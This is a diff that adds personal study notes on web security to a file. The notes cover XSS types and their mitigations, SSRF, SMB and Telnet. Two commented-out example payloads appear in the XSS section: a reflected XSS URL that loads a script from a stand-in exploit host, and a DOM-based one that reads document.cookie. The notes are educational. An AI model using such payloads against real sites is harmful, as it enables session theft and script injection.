@@ -711,9 +711,32 @@ function App() {
                 - Also, some systems log only "fully-finished" TCP connections, so the "non-finished" three-way handshake would not appear on their logs.
                 - To send a RST, nmap needs sudo privileges, in order to create raw packets.
         - ICMP is, by default, blocked on Windows systems.
+- XSS
+    - Cross-site scripting is when an attacker injects malicious scripts to be executed by other browsers.
+    - Reflected
+        - Client-supplied data in HTTP is included without validation.
+        <!-- - e.g.: https://target.site/?content=<script src="https://exploit.site/exploit.js"></script> -->
+    - Stored
+        - Content stored on the website is not validated.
+        - e.g.: a user profile bio with an script tag that is executed when the page renders.
+    - DOM-Based
+        - Data is taken from the URL and directly inserted into the DOM without validation.
+        <!-- - e.g.: http://target.site/page.html?language=<script>alert(document.cookie)</script> -->
+    - Blind
+        - Basically a stored XSS, but on the "server-side", things like staff contact, etc.
+        - Any interface where the client is able to connect "more directly" with an authority of the website is prone to Blind XSS when not properly managed.
+    - Mitigation
+        - Encode HTML before rendering.
+        - Implement a strict CSP (Content Security Policy), which means restrict the scripts execution sources.
+        - Validate input on client and server.
+- SSRF
+    - Server-side request forgery is when the attacker is able to make the server make requests to unintended locations, often internal locations like system/configuration files.
 
 ### Organize later
 
 - Server Message Block Protocol (SMB)
     - A client-server protocol used to share access to files, devices, serial ports, etc.
     - Basically a shared hard disk on the network.
+- Telnet
+    - Telnet is a protocol that allows remote connection and commands execution on another machine.
+    - As an analogy, telnet is like http and ssh is https.
